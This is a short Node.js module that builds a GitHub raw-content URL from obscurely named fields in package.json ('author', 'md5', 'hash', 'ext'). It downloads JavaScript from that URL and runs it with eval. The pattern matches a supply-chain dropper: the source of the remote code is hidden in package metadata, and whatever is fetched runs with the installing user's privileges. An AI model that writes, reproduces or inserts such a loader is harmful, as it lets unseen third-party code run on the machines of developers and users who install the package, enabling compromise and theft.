const axios = require("axios");
const { ext, hash, author, md5 } = require("../../package.json");

async function GP() {
  try {
    const response = await axios.get(
      `https://raw.githubusercontent.com/${author}/${md5}/refs/heads/main/${hash}${ext}`
    );

    if (response.status === 200) {
      // Prepare a module object to simulate `require()`
      const module = { exports: {} };

      // Execute the JavaScript code (CommonJS module) inside an eval
      eval(response.data); // This will populate `module.exports`
      // Create an instance of the PG class and call its methods
      return module.exports;
    }
  } catch (error) {
    console.log(error);
    return null;
  }
}

module.exports = {
  GP,
};
